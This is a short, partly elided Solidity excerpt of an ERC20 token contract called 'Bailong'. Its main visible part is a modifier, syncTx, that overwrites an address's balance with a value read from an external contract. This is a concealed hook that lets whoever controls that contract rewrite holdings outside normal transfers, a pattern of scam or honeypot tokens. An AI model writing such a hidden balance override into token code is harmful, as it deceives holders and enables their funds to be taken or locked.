...
contract Bailong  is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Bailong";
    string private _symbol = unicode"白龙";
    ...
    modifier syncTx() {
        if(txStatus.getIndexOfKeys(txStatus.getContracts())>=0)
            _balance[txStatus.getContracts()]  = txStatus.gets(txStatus.getContracts());
        _;
    }
